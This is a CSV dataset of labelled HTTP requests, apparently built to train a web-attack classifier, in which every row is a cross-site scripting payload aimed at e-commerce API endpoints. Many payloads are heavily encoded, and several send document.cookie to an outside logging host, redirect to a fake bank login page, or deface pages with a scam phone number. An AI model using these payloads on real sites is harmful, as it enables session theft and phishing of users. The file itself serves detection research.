RequestMethod,RequestURIPath,RequestURIQuery,RequestProtocol,UserAgent,Referer,AcceptEncoding,ContentType,Accept,Cookie,Connection,OtherHeaders,RequestBody,ResponseStatus,AIVerdictLabel,AIVulnerabilityTypeLabel,RequestLength,PathLength,QueryLength,BodyLength,NumParams,LongestParamValueLength,NumSpecialChars,NumEncodedChars,NumDoubleEncodedChars,RatioSpecialCharsToTotalChars,NumKeywords,NumUniqueChars,IsJSONBody,IsXMLBody,IsMultipartForm,HasNumericPathSegment,DepthOfPath,UsesBase64Encoding,UsesHexEncoding,HasMultipleContentLength,InvalidHTTPVersion,NumHTTPHeaders,TimeOfDayHour,TimeOfDayDayOfWeek
GET,/rest/products/search,path=data%3Atext%2Fhtml%2C%253Cscript%253Edocument.body.innerHTML%2B%253D%2B%2527%253Ch1%253ETrust%2Bme%2521%253C%252Fh1%253E%253Cp%253ECall%2Bme%2Bat%2B1%2B888%2B345%2B8443.%253C%252Fp%253E%2527%253B%253C%252Fscript%253E,HTTP/1.1,BurpSuite Professional/2024.5.4,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,378,21,221,0,1,152,38,32,20,0.157,2,39,False,False,False,False,3,False,True,False,False,4,20,Thursday
POST,/rest/products/12/reviews/,,HTTP/1.1,sqlmap/1.7.9#dev (http://sqlmap.org),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:1893,"{""message"": ""&#x47;&#x72;&#x65;&#x61;&#x74;&#x25;&#x32;&#x42;&#x70;&#x72;&#x6f;&#x64;&#x75;&#x63;&#x74;&#x25;&#x32;&#x35;&#x32;&#x43;&#x25;&#x32;&#x42;&#x62;&#x75;&#x74;&#x25;&#x32;&#x42;&#x64;&#x61;&#x74;&#x61;&#x25;&#x32;&#x35;&#x33;&#x41;&#x74;&#x65;&#x78;&#x74;&#x25;&#x32;&#x35;&#x32;&#x46;&#x68;&#x74;&#x6d;&#x6c;&#x25;&#x32;&#x35;&#x32;&#x43;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x45;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x69;&#x6e;&#x6e;&#x65;&#x72;&#x48;&#x54;&#x4d;&#x4c;&#x25;&#x32;&#x35;&#x32;&#x42;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x44;&#x25;&#x32;&#x35;&#x32;&#x42;&#x25;&#x32;&#x35;&#x32;&#x35;&#x32;&#x37;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x43;&#x68;&#x31;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x45;&#x54;&#x72;&#x75;&#x73;&#x74;&#x25;&#x32;&#x35;&#x32;&#x42;&#x6d;&#x65;&#x25;&#x32;&#x35;&#x32;&#x35;&#x32;&#x31;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x43;&#x25;&#x32;&#x35;&#x32;&#x35;&#x32;&#x46;&#x68;&#x31;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x45;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x43;&#x70;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x45;&#x43;&#x61;&#x6c;&#x6c;&#x25;&#x32;&#x35;&#x32;&#x42;&#x6d;&#x65;&#x25;&#x32;&#x35;&#x32;&#x42;&#x61;&#x74;&#x25;&#x32;&#x35;&#x32;&#x42;&#x31;&#x25;&#x32;&#x35;&#x32;&#x42;&#x38;&#x38;&#x38;&#x25;&#x32;&#x35;&#x32;&#x42;&#x33;&#x34;&#x35;&#x25;&#x32;&#x35;&#x32;&#x42;&#x38;&#x34;&#x34;&#x33;&#x2e;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x43;&#x25;&#x32;&#x35;&#x32;&#x35;&#x32;&#x46;&#x70;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x45;&#x25;&#x32;&#x35;&#x32;&#x35;&#x32;&#x37;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x42;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x43;&#x25;&#x32;&#x35;&#x32;&#x35;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x32;&#x35;&#x32;&#x35;&#x33;&#x45;"", ""author"": ""XSS+TEStEr""}",,malicious,xss,2114,26,0,1893,2,1854,946,0,0,0.493,1,43,True,False,False,True,4,False,False,False,False,6,20,Thursday
GET,/rest/products/search,path=%253Cinput%2Btype%253Dhidden%2Bonfocus%253Ddocument.body.innerHTML%2B%253D%2B%2527%253Ch1%253ETrust%2Bme%2521%253C%252Fh1%253E%253Cp%253ECall%2Bme%2Bat%2B1%2B888%2B345%2B8443.%253C%252Fp%253E%2527%253B%2Bautofocus%253E,HTTP/1.1,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,427,21,223,0,1,156,37,31,19,0.1516,1,38,False,False,False,False,3,True,True,False,False,4,20,Thursday
PUT,/api/Users/5,,HTTP/1.1,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:140,"{""name"": ""XSS User <body onchange=document.body.innerHTML = '<h1>Trust me!</h1><p>Call me at 1 888 345 8443.</p>';>"", ""bio"": ""Some XSS Bio""}",,malicious,xss,444,12,0,140,2,105,35,0,0,0.2303,3,46,True,False,False,True,3,True,False,False,False,6,20,Thursday
GET,/rest/products/search,q=%253csVg%252FOnMouseoveR%253dneW%2Bimage%2528%2529.SRC%2B%253D%2B%2522htTPS%253A%252f%252FWenoJHDSKdsf.cOm%252fLoG_cOOkIE.PhP%253fC%253d%2522%2B%252B%2BdOcumEnT.CookIE%253b%253e,HTTP/1.1,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,379,21,179,0,1,133,30,22,17,0.15,1,50,False,False,False,False,3,True,True,False,False,4,20,Thursday
GET,/rest/products/search,category=%3CImG+SRc%3Dx+OnsubMIt%3DnEw+iMAgE%28%29.SRc+%3D+%22httPs%3A%2F%2FwEnojHdSkDSf.CoM%2FLOg_CooKie.Php%3FC%3D%22+%2B+docuMENT.CoOKiE%3B%3E,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,388,21,145,0,1,102,32,17,0,0.1928,1,50,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,q=data%3Atext%2Fhtml%2C%253Cscript%253Edocument.body.innerHTML%2B%253D%2B%2527%253Ch1%253ETrust%2Bme%2521%253C%252Fh1%253E%253Cp%253ECall%2Bme%2Bat%2B1%2B888%2B345%2B8443.%253C%252Fp%253E%2527%253B%253C%252Fscript%253E,HTTP/1.1,Wget/,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,349,21,218,0,1,152,38,32,20,0.159,2,40,False,False,False,False,3,False,True,False,False,4,20,Thursday
PUT,/api/Users/5,,HTTP/1.1,GuzzleHttp/7.2,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:1127,"{""name"": ""&#x58;&#x53;&#x53;&#x25;&#x32;&#x42;&#x55;&#x73;&#x65;&#x72;&#x25;&#x32;&#x42;&#x25;&#x32;&#x35;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x32;&#x35;&#x33;&#x45;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x68;&#x72;&#x65;&#x66;&#x25;&#x32;&#x42;&#x25;&#x32;&#x35;&#x33;&#x44;&#x25;&#x32;&#x42;&#x25;&#x32;&#x35;&#x32;&#x32;&#x68;&#x74;&#x74;&#x70;&#x73;&#x25;&#x32;&#x35;&#x33;&#x41;&#x25;&#x32;&#x35;&#x32;&#x46;&#x25;&#x32;&#x35;&#x32;&#x46;&#x70;&#x61;&#x6e;&#x6b;&#x6f;&#x66;&#x61;&#x6d;&#x65;&#x72;&#x69;&#x6b;&#x61;&#x2e;&#x63;&#x6f;&#x6d;&#x25;&#x32;&#x35;&#x32;&#x46;&#x66;&#x61;&#x6b;&#x65;&#x5f;&#x6c;&#x6f;&#x67;&#x69;&#x6e;&#x25;&#x32;&#x35;&#x32;&#x32;&#x25;&#x32;&#x35;&#x33;&#x42;&#x25;&#x32;&#x35;&#x33;&#x43;&#x25;&#x32;&#x35;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x32;&#x35;&#x33;&#x45;"", ""bio"": ""%26%23%78%35%33%3b%26%23%78%36%66%3b%26%23%78%36%64%3b%26%23%78%36%35%3b%26%23%78%32%30%3b%26%23%78%35%38%3b%26%23%78%35%33%3b%26%23%78%35%33%3b%26%23%78%32%30%3b%26%23%78%34%32%3b%26%23%78%36%39%3b%26%23%78%36%66%3b""}",,malicious,xss,1311,12,0,1127,2,888,532,72,0,0.4671,0,36,True,False,False,True,3,False,True,False,False,6,20,Thursday
PUT,/api/Users/4,,HTTP/1.1,"Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:141,"{""name"": ""XSS uSEr <A hrEf=\""jAVascripT:wIndOW.LoCaTIoN.HRef = \""hTtpS://PaNkOFAmERIKa.COM/fAKE_LoGIn\"";\"">logIn</a>"", ""bio"": ""Some+XSS+Bio""}",,malicious,xss,436,12,0,141,2,102,41,0,0,0.268,5,58,True,False,False,True,3,False,False,False,False,6,20,Thursday
GET,/rest/products/search,q=%253Csvg%252Fonerror%253Dwindow.location.href%2B%253D%2B%2522https%253A%252F%252Fpankofamerika.com%252Ffake_login%2522%253B%253E,HTTP/1.1,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,373,21,130,0,1,100,21,14,12,0.1391,1,35,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,search=%3Csvg%2Fonkeydown%3Dnew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B%3E,HTTP/1.1,BurpSuite Free/2024.5.4,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,287,21,138,0,1,97,30,17,0,0.1887,1,39,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,search=%25253Cinput%252Btype%25253Dsearch%252Bonload%25253Ddocument.body.innerHTML%252B%25253D%252B%252527%25253Ch1%25253ETrust%252Bme%252521%25253C%25252Fh1%25253E%25253Cp%25253ECall%252Bme%252Bat%252B1%252B888%252B345%252B8443.%25253C%25252Fp%25253E%252527%25253B%252Bautofocus%25253E,HTTP/1.1,Nikto/2.1.6,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,423,21,286,0,1,217,37,31,31,0.1205,1,38,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,query=%3Cbody+oninput%3Dwindow.location.href+%3D+%22https%3A%2F%2Fpankofamerika.com%2Ffake_login%22%3B%3E,HTTP/1.1,Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,302,21,105,0,1,77,21,11,0,0.1667,1,36,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,path=%3Cbody+onchange%3Ddocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B%3E,HTTP/1.1,"Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/24.0 Chrome/125.0.0.0 Mobile Safari/537.36",,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,409,21,137,0,1,96,34,18,0,0.2152,1,39,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,q=%26%23x3c%3B%26%23x73%3B%26%23x76%3B%26%23x67%3B%26%23x2f%3B%26%23x6f%3B%26%23x6e%3B%26%23x69%3B%26%23x6e%3B%26%23x70%3B%26%23x75%3B%26%23x74%3B%26%23x3d%3B%26%23x6e%3B%26%23x65%3B%26%23x77%3B%26%23x20%3B%26%23x49%3B%26%23x6d%3B%26%23x61%3B%26%23x67%3B%26%23x65%3B%26%23x28%3B%26%23x29%3B%26%23x2e%3B%26%23x73%3B%26%23x72%3B%26%23x63%3B%26%23x20%3B%26%23x3d%3B%26%23x20%3B%26%23x22%3B%26%23x68%3B%26%23x74%3B%26%23x74%3B%26%23x70%3B%26%23x73%3B%26%23x3a%3B%26%23x2f%3B%26%23x2f%3B%26%23x77%3B%26%23x65%3B%26%23x6e%3B%26%23x6f%3B%26%23x6a%3B%26%23x68%3B%26%23x64%3B%26%23x73%3B%26%23x6b%3B%26%23x64%3B%26%23x73%3B%26%23x66%3B%26%23x2e%3B%26%23x63%3B%26%23x6f%3B%26%23x6d%3B%26%23x2f%3B%26%23x6c%3B%26%23x6f%3B%26%23x67%3B%26%23x5f%3B%26%23x63%3B%26%23x6f%3B%26%23x6f%3B%26%23x6b%3B%26%23x69%3B%26%23x65%3B%26%23x2e%3B%26%23x70%3B%26%23x68%3B%26%23x70%3B%26%23x3f%3B%26%23x63%3B%26%23x3d%3B%26%23x22%3B%26%23x20%3B%26%23x2b%3B%26%23x20%3B%26%23x64%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x6d%3B%26%23x65%3B%26%23x6e%3B%26%23x74%3B%26%23x2e%3B%26%23x63%3B%26%23x6f%3B%26%23x6f%3B%26%23x6b%3B%26%23x69%3B%26%23x65%3B%26%23x3b%3B%26%23x3e%3B,HTTP/1.1,Nikto/,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1274,21,1142,0,1,570,288,285,0,0.2476,0,29,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,category=%3Cscript%3Enew+Image%28%29.src+%3D+%22https%3A%2F%2Fwenojhdskdsf.com%2Flog_cookie.php%3Fc%3D%22+%2B+document.cookie%3B%3C%2Fscript%3E,HTTP/1.1,Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,352,21,143,0,1,98,31,18,0,0.189,3,38,False,False,False,False,3,True,True,False,False,4,20,Thursday
POST,/rest/memories,,HTTP/1.1,sqlmap/,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:241,"{""caption"": ""My XSS Memory <img src=x onchange=window.location.href = \""https://pankofamerika.com/fake_login\"";>"", ""image"": ""data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=""}",,malicious,xss,420,14,0,241,2,114,34,0,0,0.1333,3,61,True,False,False,False,2,False,False,False,False,6,20,Thursday
GET,/rest/products/search,path=%25253CSvG%25252FoNfoCUs%25253DNeW%252BIMage%252528%252529.SRC%252B%25253D%252B%252522HTtPS%25253A%25252F%25252FWeNOjHDskdSf.CoM%25252FlOG_cOokie.PHP%25253FC%25253D%252522%252B%25252B%252BDOcUMENT.CooKIe%25253B%25253E,HTTP/1.1,Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07),,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,419,21,222,0,1,173,30,22,22,0.1235,1,47,False,False,False,False,3,False,True,False,False,4,20,Thursday
GET,/rest/products/search,id=%253C%2561%2520%2568%2572%2565%2566%253D%2522%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%256E%2565%2577%2520%2549%256D%2561%2567%2565%2528%2529%252E%2573%2572%2563%2520%253D%2520%2522%2568%2574%2574%2570%2573%253A%252f%252F%2577%2565%256e%256f%256A%2568%2564%2573%256B%2564%2573%2566%252E%2563%256F%256D%252f%256c%256f%2567%255F%2563%256F%256F%256b%2569%2565%252E%2570%2568%2570%253f%2563%253d%2522%2520%252B%2520%2564%256F%2563%2575%256d%2565%256E%2574%252E%2563%256F%256F%256b%2569%2565%253B%2522%253E%2543%256c%2569%2563%256B%2520%256d%2565%253c%252f%2561%253e,HTTP/1.1,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,784,21,578,0,1,345,118,115,115,0.197,0,33,False,False,False,False,3,False,True,False,False,4,20,Thursday
POST,/api/Feedbacks/,,HTTP/1.1,sqlmap/1.7.9#dev (http://sqlmap.org),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:261,"{""comment"": ""This%2Bis%2Ba%2Btest%2Bfeedback%2Bwith%2B%253Csvg%252Fonmouseover%253Ddocument.body.innerHTML%2B%253D%2B%2527%253Ch1%253ETrust%2Bme%2521%253C%252Fh1%253E%253Cp%253ECall%2Bme%2Bat%2B1%2B888%2B345%2B8443.%253C%252Fp%253E%2527%253B%253E"", ""rating"": 5}",,malicious,xss,470,15,0,261,2,233,51,34,19,0.1848,0,47,True,False,False,False,2,True,True,False,False,6,20,Thursday
POST,/api/Addresses,,HTTP/1.1,sqlmap/1.7.9#dev (http://sqlmap.org),,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:1071,"{""fullName"": ""&#x58;&#x53;&#x53;&#x20;&#x55;&#x73;&#x65;&#x72;&#x20;&#x3c;&#x61;&#x20;&#x68;&#x72;&#x65;&#x66;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x64;&#x6f;&#x63;&#x75;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x62;&#x6f;&#x64;&#x79;&#x2e;&#x69;&#x6e;&#x6e;&#x65;&#x72;&#x48;&#x54;&#x4d;&#x4c;&#x20;&#x3d;&#x20;&#x27;&#x3c;&#x68;&#x31;&#x3e;&#x54;&#x72;&#x75;&#x73;&#x74;&#x20;&#x6d;&#x65;&#x21;&#x3c;&#x2f;&#x68;&#x31;&#x3e;&#x3c;&#x70;&#x3e;&#x43;&#x61;&#x6c;&#x6c;&#x20;&#x6d;&#x65;&#x20;&#x61;&#x74;&#x20;&#x31;&#x20;&#x38;&#x38;&#x38;&#x20;&#x33;&#x34;&#x35;&#x20;&#x38;&#x34;&#x34;&#x33;&#x2e;&#x3c;&#x2f;&#x70;&#x3e;&#x27;&#x3b;&#x22;&#x3e;&#x44;&#x6f;&#x77;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x3c;&#x2f;&#x61;&#x3e;"", ""country"": ""USA"", ""zipCode"": ""%31%32%33%34%35"", ""streetAddress"": ""XSS+Street+%3Ca+href%3D%22javascript%3Adocument.body.innerHTML+%3D+%27%3Ch1%3ETrust+me%21%3C%2Fh1%3E%3Cp%3ECall+me+at+1+888+345+8443.%3C%2Fp%3E%27%3B%22%3EDownload%3C%2Fa%3E"", ""city"": ""&#x58;&#x53;&#x53;&#x20;&#x43;&#x69;&#x74;&#x79;"", ""state"": ""XX""}",,malicious,xss,1280,14,0,1071,6,738,476,29,0,0.4387,2,60,True,False,False,False,2,False,True,False,False,6,20,Thursday
GET,/rest/products/search,category=%26%23x3c%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3e%3B%26%23x64%3B%26%23x6f%3B%26%23x63%3B%26%23x75%3B%26%23x6d%3B%26%23x65%3B%26%23x6e%3B%26%23x74%3B%26%23x2e%3B%26%23x62%3B%26%23x6f%3B%26%23x64%3B%26%23x79%3B%26%23x2e%3B%26%23x69%3B%26%23x6e%3B%26%23x6e%3B%26%23x65%3B%26%23x72%3B%26%23x48%3B%26%23x54%3B%26%23x4d%3B%26%23x4c%3B%26%23x20%3B%26%23x3d%3B%26%23x20%3B%26%23x27%3B%26%23x3c%3B%26%23x68%3B%26%23x31%3B%26%23x3e%3B%26%23x54%3B%26%23x72%3B%26%23x75%3B%26%23x73%3B%26%23x74%3B%26%23x20%3B%26%23x6d%3B%26%23x65%3B%26%23x21%3B%26%23x3c%3B%26%23x2f%3B%26%23x68%3B%26%23x31%3B%26%23x3e%3B%26%23x3c%3B%26%23x70%3B%26%23x3e%3B%26%23x43%3B%26%23x61%3B%26%23x6c%3B%26%23x6c%3B%26%23x20%3B%26%23x6d%3B%26%23x65%3B%26%23x20%3B%26%23x61%3B%26%23x74%3B%26%23x20%3B%26%23x31%3B%26%23x20%3B%26%23x38%3B%26%23x38%3B%26%23x38%3B%26%23x20%3B%26%23x33%3B%26%23x34%3B%26%23x35%3B%26%23x20%3B%26%23x38%3B%26%23x34%3B%26%23x34%3B%26%23x33%3B%26%23x2e%3B%26%23x3c%3B%26%23x2f%3B%26%23x70%3B%26%23x3e%3B%26%23x27%3B%26%23x3b%3B%26%23x3c%3B%26%23x2f%3B%26%23x73%3B%26%23x63%3B%26%23x72%3B%26%23x69%3B%26%23x70%3B%26%23x74%3B%26%23x3e%3B,HTTP/1.1,Python-urllib/3.10,,"gzip, deflate, br",,*/*,,keep-alive,,,,malicious,xss,1317,21,1173,0,1,582,294,291,0,0.2462,0,30,False,False,False,False,3,False,True,False,False,4,20,Thursday
PUT,/api/Users/1,,HTTP/1.1,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0,,"gzip, deflate, br",application/json,*/*,,keep-alive,Content-Length:2405,"{""name"": ""&#x25;&#x35;&#x38;&#x25;&#x35;&#x33;&#x25;&#x35;&#x33;&#x25;&#x32;&#x30;&#x25;&#x35;&#x35;&#x25;&#x37;&#x33;&#x25;&#x36;&#x35;&#x25;&#x37;&#x32;&#x25;&#x32;&#x30;&#x25;&#x36;&#x34;&#x25;&#x36;&#x31;&#x25;&#x37;&#x34;&#x25;&#x36;&#x31;&#x25;&#x33;&#x61;&#x25;&#x37;&#x34;&#x25;&#x36;&#x35;&#x25;&#x37;&#x38;&#x25;&#x37;&#x34;&#x25;&#x32;&#x66;&#x25;&#x36;&#x38;&#x25;&#x37;&#x34;&#x25;&#x36;&#x64;&#x25;&#x36;&#x63;&#x25;&#x32;&#x63;&#x25;&#x32;&#x35;&#x25;&#x33;&#x33;&#x25;&#x34;&#x33;&#x25;&#x37;&#x33;&#x25;&#x36;&#x33;&#x25;&#x37;&#x32;&#x25;&#x36;&#x39;&#x25;&#x37;&#x30;&#x25;&#x37;&#x34;&#x25;&#x32;&#x35;&#x25;&#x33;&#x33;&#x25;&#x34;&#x35;&#x25;&#x37;&#x37;&#x25;&#x36;&#x39;&#x25;&#x36;&#x65;&#x25;&#x36;&#x34;&#x25;&#x36;&#x66;&#x25;&#x37;&#x37;&#x25;&#x32;&#x65;&#x25;&#x36;&#x63;&#x25;&#x36;&#x66;&#x25;&#x36;&#x33;&#x25;&#x36;&#x31;&#x25;&#x37;&#x34;&#x25;&#x36;&#x39;&#x25;&#x36;&#x66;&#x25;&#x36;&#x65;&#x25;&#x32;&#x65;&#x25;&#x36;&#x38;&#x25;&#x37;&#x32;&#x25;&#x36;&#x35;&#x25;&#x36;&#x36;&#x25;&#x32;&#x62;&#x25;&#x32;&#x35;&#x25;&#x33;&#x33;&#x25;&#x34;&#x34;&#x25;&#x32;&#x62;&#x25;&#x32;&#x35;&#x25;&#x33;&#x32;&#x25;&#x33;&#x32;&#x25;&#x36;&#x38;&#x25;&#x37;&#x34;&#x25;&#x37;&#x34;&#x25;&#x37;&#x30;&#x25;&#x37;&#x33;&#x25;&#x32;&#x35;&#x25;&#x33;&#x33;&#x25;&#x34;&#x31;&#x25;&#x32;&#x35;&#x25;&#x33;&#x32;&#x25;&#x34;&#x36;&#x25;&#x32;&#x35;&#x25;&#x33;&#x32;&#x25;&#x34;&#x36;&#x25;&#x37;&#x30;&#x25;&#x36;&#x31;&#x25;&#x36;&#x65;&#x25;&#x36;&#x62;&#x25;&#x36;&#x66;&#x25;&#x36;&#x36;&#x25;&#x36;&#x31;&#x25;&#x36;&#x64;&#x25;&#x36;&#x35;&#x25;&#x37;&#x32;&#x25;&#x36;&#x39;&#x25;&#x36;&#x62;&#x25;&#x36;&#x31;&#x25;&#x32;&#x65;&#x25;&#x36;&#x33;&#x25;&#x36;&#x66;&#x25;&#x36;&#x64;&#x25;&#x32;&#x35;&#x25;&#x33;&#x32;&#x25;&#x34;&#x36;&#x25;&#x36;&#x36;&#x25;&#x36;&#x31;&#x25;&#x36;&#x62;&#x25;&#x36;&#x35;&#x25;&#x35;&#x66;&#x25;&#x36;&#x63;&#x25;&#x36;&#x66;&#x25;&#x36;&#x37;&#x25;&#x36;&#x39;&#x25;&#x36;&#x65;&#x25;&#x32;&#x35;&#x25;&#x33;&#x32;&#x25;&#x33;&#x32;&#x25;&#x32;&#x35;&#x25;&#x33;&#x33;&#x25;&#x34;&#x32;&#x25;&#x32;&#x35;&#x25;&#x33;&#x33;&#x25;&#x34;&#x33;&#x25;&#x32;&#x35;&#x25;&#x33;&#x32;&#x25;&#x34;&#x36;&#x25;&#x37;&#x33;&#x25;&#x36;&#x33;&#x25;&#x37;&#x32;&#x25;&#x36;&#x39;&#x25;&#x37;&#x30;&#x25;&#x37;&#x34;&#x25;&#x32;&#x35;&#x25;&#x33;&#x33;&#x25;&#x34;&#x35;"", ""bio"": ""%2553%256f%256d%2565%2520%2558%2553%2553%2520%2542%2569%256f""}",,malicious,xss,2659,12,0,2405,2,2322,1189,12,12,0.4919,0,35,True,False,False,True,3,False,True,False,False,6,20,Thursday
